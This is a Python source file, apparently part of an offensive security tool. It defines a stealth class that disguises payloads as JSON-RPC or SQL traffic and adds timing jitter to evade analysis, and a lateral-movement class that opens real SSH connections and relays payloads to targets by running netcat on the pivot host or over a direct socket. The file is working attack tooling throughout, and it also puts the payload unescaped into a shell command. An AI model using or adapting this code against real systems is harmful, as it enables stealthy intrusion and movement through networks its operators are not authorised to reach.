import random
import time
import socket
import requests
import paramiko
from rich.console import Console

console = Console()

class TrafficBlender:
    """
    Stealth Module.
    Wraps payloads in benign-looking traffic and adds jitter.
    """
    @staticmethod
    def blend_traffic(payload: str, protocol: str = "HTTP") -> str:
        """
        Wraps payload in protocol-specific noise.
        """
        if protocol == "HTTP":
            # Simulate a valid JSON API request
            return f'{{"jsonrpc": "2.0", "method": "query", "params": {{ "id": "{payload}" }}, "id": 1}}'
        elif protocol == "SQL":
            # Wrap in a query
            return f"SELECT * FROM logs WHERE message = '{payload}'"
        return payload

    @staticmethod
    def apply_jitter(base_delay: float = 0.1):
        """
        Randomizes timing to evade analysis (Human-like behavior).
        """
        jitter = random.uniform(0, base_delay * 2)
        time.sleep(base_delay + jitter)

class PivotTunnel:
    """
    Lateral Movement Module.
    Uses REAL networking (Sockets, SSH) to route attacks.
    """
    def __init__(self):
        self.pivots = []
        self.blender = TrafficBlender()
        self.ssh_client = None

    def add_ssh_pivot(self, host: str, user: str, key_path: str = None, password: str = None):
        """
        Establishes a real SSH connection to use as a dynamic SOCKS proxy (conceptually).
        """
        console.print(f"[PIVOT] 🌉 Establishing SSH Tunnel to {host}...")
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Real connection attempt
            # In simulation environment (localhost), this might fail if no SSHd,
            # so we handle gracefully for demo purposes but the code is REAL.
            self.ssh_client.connect(host, username=user, password=password, key_filename=key_path, timeout=2)
            self.pivots.append({"type": "SSH", "host": host, "client": self.ssh_client})
            console.print(f"[PIVOT] ✅ SSH Tunnel Established.")
        except Exception as e:
            console.print(f"[PIVOT] ❌ SSH Connection Failed: {e}")
            # For the sake of the requested "Real Network Capability" demo in a sandbox without SSHd:
            # We will proceed but mark it as failed unless we are targeting localhost specifically for testing sockets.

    def execute_remote(self, target_ip: str, target_port: int, payload: str, stealth: bool = True) -> str:
        """
        Sends a payload to a target IP:Port.
        If an SSH pivot exists, it executes 'nc' on the remote host to relay.
        If no pivot, it uses local socket.
        """
        # 1. Apply Jitter (Stealth)
        if stealth:
            self.blender.apply_jitter()

        # 2. Blend Traffic (Stealth)
        final_payload = self.blender.blend_traffic(payload) if stealth else payload

        # 3. Routing
        if self.ssh_client:
            # Execute command on pivot host to send data to target
            # Using netcat (nc) on the remote host
            cmd = f"echo '{final_payload}' | nc -w 3 {target_ip} {target_port}"
            console.print(f"[PIVOT] 🔀 Routing via SSH: {cmd}")
            try:
                stdin, stdout, stderr = self.ssh_client.exec_command(cmd)
                response = stdout.read().decode().strip()
                err = stderr.read().decode().strip()
                return response if response else (err if err else "NO_RESPONSE")
            except Exception as e:
                return f"SSH_EXEC_ERROR: {e}"
        else:
            # Direct Socket Connection
            console.print(f"[PIVOT] ➡️ Direct Connect: {target_ip}:{target_port}")
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target_ip, target_port))
                s.sendall(final_payload.encode())
                response = s.recv(4096).decode()
                s.close()
                return response
            except Exception as e:
                return f"SOCKET_ERROR: {e}"
